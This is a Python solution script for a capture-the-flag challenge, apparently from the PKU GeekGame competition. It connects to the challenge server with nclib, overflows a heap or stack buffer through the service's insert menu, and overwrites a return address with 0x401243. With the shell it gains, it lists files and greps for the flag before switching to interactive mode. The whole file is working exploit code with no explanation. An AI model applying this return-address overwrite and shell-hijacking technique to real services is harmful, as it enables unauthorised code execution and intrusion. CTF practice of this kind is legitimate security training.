import nclib

token = "{TOKEN_HERE}"
addr = "prob12.geekgame.pku.edu.cn"
port = 10012

nc = nclib.Netcat((addr, port))
print(nc.recv())
nc.send((token + "\n").encode())
print(nc.recv())
nc.send(b"1\n") # option: insert
print(nc.recv())
nc.send(b"0\n") # key: 0
print(nc.recv())
nc.send(f"{0x200 - 24}\n".encode()) # data size: 0x200 - 24
print(nc.recv())
to_write = bytearray()
to_write.extend(b"." * (0x200 - 24 + 8))
to_write.extend(b"\x43\x12\x40\x00\x00\x00\x00\x00") # return address 0x401243
to_write.extend(b"\n")
nc.send(bytes(to_write))
print(nc.recv())
nc.send(b"4ls && grep -r flag *\n") # option: quit
print(nc.recv().decode())
nc.send(b"ls\n")
print(nc.recv().decode())
nc.send(b'grep -r "flag{" *\n')
print(nc.recv().decode())
nc.interactive()
nc.close()
